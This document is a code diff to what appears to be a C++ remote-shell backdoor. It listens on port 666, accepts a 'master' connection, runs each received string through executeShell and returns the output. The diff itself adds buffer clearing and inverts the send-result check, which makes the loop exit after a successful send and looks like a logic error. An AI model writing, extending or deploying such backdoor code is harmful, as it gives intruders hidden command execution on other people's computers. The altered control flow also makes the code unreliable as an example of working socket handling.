@@ -10,10 +10,12 @@ void telNet(SOCKET s)
     std::string stdOut;
     while (1)
     {
+        ZeroMemory(buf, 65536);
         if(!recv(s, buf, 65536, 0))
             break;
+
         stdOut = executeShell(buf);
-        if (!sendStdOut(s, stdOut))
+        if (sendStdOut(s, stdOut))
             break;
     }
     delete[] buf;
@@ -36,6 +38,7 @@ int main(int argc, char** argv)
 
     if (!mastersIP)
         return 1;
+
     addressinfo.sin_addr.s_addr = getPrivateIP();
     addressinfo.sin_port = htons(666);
     addressinfo.sin_family = AF_INET;
@@ -53,6 +56,7 @@ int main(int argc, char** argv)
 
     if(listen(s, 1) < 0)
         std::cout << "Listen error <" << WSAGetLastError() << ">" << std::endl;
+
     SOCKET master = accept(s, NULL, 0);
     if (!s | !master)
         return 1;
